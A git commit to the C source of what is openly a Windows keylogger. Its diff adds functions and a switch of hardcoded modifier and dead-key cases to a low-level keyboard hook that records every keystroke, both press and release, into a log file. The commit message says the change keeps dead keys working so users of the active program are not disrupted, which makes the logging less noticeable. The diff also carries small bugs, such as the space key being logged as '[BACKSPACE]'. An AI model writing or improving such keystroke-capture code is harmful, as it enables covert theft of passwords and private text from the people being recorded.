da9f126aa7a0bd733411427c36e7bdb47d9bbd8e
Alfonzitos <nylenalfons@gmail.com>
2023-01-28 17:00:29 +0100

    Deadkeys have to be hardcoded to be properly detected
    The issue of the program consuming deadkeys persists, hence not allowing them to be proccessed by the active program. This means users cannot use deadkeys while program is active

--- main.c
+++ main.c
@@ -6,7 +6,8 @@
 #define UP 0
 
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
-int LogCharToFile(WCHAR *key, int state);
+int LogUnicodeCharToFile(WCHAR *key, int state);
+int LogStringToFile(char *string, int state);
 
 int main(void)
 {
@@ -27,7 +28,7 @@ int LogUnicodeCharToFile(WCHAR *key, int state)
     }
     else if (state == UP)
     {
-       
+
         fputs("[UP]    ::  ", file);
     }
     fclose(file);
@@ -38,6 +39,25 @@ int LogUnicodeCharToFile(WCHAR *key, int state)
     file = fopen(LOGFILE, "a");
     fputs("\n", file);
 
+    fflush(file);
+    fclose(file);
+}
+
+int LogStringToFile(char *string, int state)
+{
+    FILE *file = fopen(LOGFILE, "a");
+    if (state == WM_KEYDOWN)
+    {
+        fputs("[DOWN]  ::  ", file);
+        fputs(string, file);
+        fputs("\n", file);
+    }
+    else if (state == WM_KEYUP)
+    {
+        fputs("[UP]    ::  ", file);
+        fputs(string, file);
+        fputs("\n", file);
+    }
     fflush(file);
     fclose(file);
 }
@@ -53,28 +73,63 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
     else
     {
         PKBDLLHOOKSTRUCT KB_struct_pointer = (PKBDLLHOOKSTRUCT)lParam;
-        BYTE state[256];
-        GetKeyboardState(state); //  needs to be done for ToUnicode
-                                 //  to work, even though parameter is supposed to be optional?
-        int k = KB_struct_pointer->vkCode;
-        WCHAR buf[10] = {0};
-        int res = ToUnicode(KB_struct_pointer->vkCode, KB_struct_pointer->scanCode, state, buf, 10, 0);
+        int deadkey = 0;
 
-        if (wParam == WM_KEYDOWN)
+        switch (KB_struct_pointer->vkCode)
         {
-            if (res != 0)
+        case VK_LSHIFT:
+            LogStringToFile("[LEFT SHIFT]", wParam);
+            deadkey = 1;
+            break;
+        case VK_RSHIFT:
+            LogStringToFile("[RIGHT SHIFT]", wParam);
+            deadkey = 1;
+            break;
+        case VK_LCONTROL:
+            LogStringToFile("[LEFT CONTROL]", wParam);
+            deadkey = 1;
+            break;
+        case VK_RCONTROL:
+            LogStringToFile("[RIGHT CONTROL]", wParam);
+            deadkey = 1;
+            break;
+        case VK_SPACE:
+            LogStringToFile("[BACKSPACE]", wParam);
+            deadkey = 1;
+            break;
+        case VK_OEM_3:
+            LogStringToFile("[VK_OEM_3", wParam);
+            deadkey = 1;
+            break;
+        case VK_OEM_4:
+            LogStringToFile("VK_OEM_4", wParam);
+            deadkey = 1;
+            break;
+        }
+
+        if (deadkey == 0)
+        {
+            BYTE state[256];
+            GetKeyboardState(state); //  needs to be done for ToUnicode
+                                     //  to work, even though parameter is supposed to be optional?
+            WCHAR buf[10] = {0};
+            int res = ToUnicode(KB_struct_pointer->vkCode, KB_struct_pointer->scanCode, state, buf, 10, 0);
+
+            if (wParam == WM_KEYDOWN)
             {
-                LogUnicodeCharToFile(buf, DOWN);
+                if (res > 0)
+                {
+                    LogUnicodeCharToFile(buf, DOWN);
+                }
+            }
+            else if (wParam == WM_KEYUP)
+            {
+                if (res > 0)
+                {
+                    LogUnicodeCharToFile(buf, UP);
+                }
             }
         }
-        else if (wParam == WM_KEYUP)
-        {
-            if (res != 0)
-            {
-                LogUnicodeCharToFile(buf, UP);
-            }
-        }
-        
         return CallNextHookEx(NULL, nCode, wParam, lParam);
     }
 }
